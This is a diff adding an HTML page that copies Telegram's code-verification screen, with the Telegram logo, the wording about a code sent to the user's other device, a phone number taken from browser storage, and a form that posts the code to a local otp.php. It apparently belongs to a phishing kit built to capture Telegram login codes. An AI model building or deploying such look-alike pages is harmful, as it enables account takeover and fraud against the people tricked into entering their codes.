@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <link rel="icon" href="Image/logo.svg" type="image/png">
+    <!-- Author: Sajjad -->
+    <style>
+        body {
+            background-color: #212121;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        input[type="text"] {
+            width: 250px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 16px;
+            border: 1px solid #333;
+            background-color: transparent;
+            color: #fff;
+            border-radius: 5px;
+        }
+        img {
+            width: 100px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        button {
+            width: 271px;
+            padding: 10px;
+            margin-top: 20px;
+            font-size: 16px;
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0077b3;
+        }
+        button:active {
+            background-color: #006699;
+        }
+        input[type="text"]:hover {
+            border-color: #815bd3;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="Image/logo.svg" alt="Telegram Logo">
+    <h2 id="phone-number"></h2>
+    <p>We've sent the code to the <b>Telegram</b> app on your<br>other device.</p>
+
+    <form method="post" action="otp.php">
+        <input type="text" name="otp" placeholder="Code" required></input><br>
+        <button type="submit">Verify</button>
+    </form>
+
+    <script>
+        // Get the phone number from localStorage
+        var phoneNumber = localStorage.getItem('phone-number');
+        
+        // Display the phone number in the h2 element
+        if (phoneNumber) {
+            document.getElementById("phone-number").innerText = phoneNumber;
+        }
+    </script>
+</body>
+</html>
